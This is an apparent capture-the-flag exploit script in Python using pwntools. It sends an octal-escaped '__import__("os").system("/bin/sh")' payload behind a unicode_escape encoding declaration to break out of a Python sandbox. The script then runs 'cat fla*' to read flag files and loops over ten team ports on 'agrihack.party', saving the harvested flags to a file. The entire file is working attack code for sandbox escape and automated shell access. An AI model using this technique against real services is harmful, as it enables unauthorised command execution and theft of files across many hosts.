from pwn import *

def unicode_escape(s):
        res = ''
        for c in s:
            res += '\\'+oct(ord(c)).lstrip("0").zfill(3)
        return res

def get_flag(host,port):
    conn = remote(host,port)
    
    payload = '__import__("os").system("/bin/sh")'
    payload = unicode_escape(payload)
     
    
        
    conn.sendline("# Encoding: Unicode_Escape \r" + payload)
    
    conn.recvuntil(">>>")
    conn.sendline("cat fla*")
    flag =  conn.recvline().strip()
    
    
    conn.close()
    return flag
    
    
def loop_through():
    flags = []
    for team in range(1,11):
        # ganti disiniii
        if team >9:
            team_str = str(team)
        else:
            team_str = '0'+str(team)
        port = int("3"+team_str+"08")
        flag = get_flag("agrihack.party",port)
        flags.append(flag.strip())
    return flags

    

def start():
    flags = loop_through()
    count = 1
    file_out = open('out','w')
    for flag in flags:
        file_out.write(flag + ',' +str(count)+',8\n')
        count+=1
    
    
#get_flag("agrihack.party",30108)
start()
